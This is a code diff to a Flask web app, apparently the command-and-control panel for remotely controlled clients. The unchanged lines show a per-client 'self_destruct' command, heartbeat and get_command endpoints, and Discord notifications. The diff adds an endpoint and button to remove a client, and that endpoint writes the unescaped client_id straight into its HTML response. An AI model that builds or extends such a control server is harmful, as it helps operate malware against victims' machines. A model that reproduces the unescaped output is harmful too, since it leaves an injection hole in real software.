@@ -214,6 +214,10 @@ def admin_panel():
                     <input type="hidden" name="command" value="self_destruct">
                     <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
                 </form>
+                <form action="/api/remove_client" method="post" style="display: inline;">
+                    <input type="hidden" name="client_id" value="{client_id}">
+                    <button style="background: #6c757d;">🗑️</button>
+                </form>
             </td>
         </tr>
         """
@@ -381,6 +385,30 @@ def heartbeat():
             
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/api/remove_client', methods=['POST'])
+def remove_client_endpoint():
+    """Rimuove client manualmente dal pannello"""
+    try:
+        client_id = request.form.get('client_id')
+        
+        if not client_id:
+            return "Errore: client_id mancante", 400
+        
+        # Rimuovi client
+        client_manager.remove_client(client_id)
+        
+        # Notifica Discord
+        send_to_discord(f"🗑️ Client {client_id} rimosso manualmente dal pannello")
+        
+        return f'''
+        <h3>Client Rimosso!</h3>
+        <p>Client {client_id} è stato rimosso dal sistema.</p>
+        <p><a href="/admin">Torna al Panel</a></p>
+        '''
+        
+    except Exception as e:
+        return f"Errore: {str(e)}", 500
 
 @app.route('/api/get_command', methods=['GET'])
 def get_command():
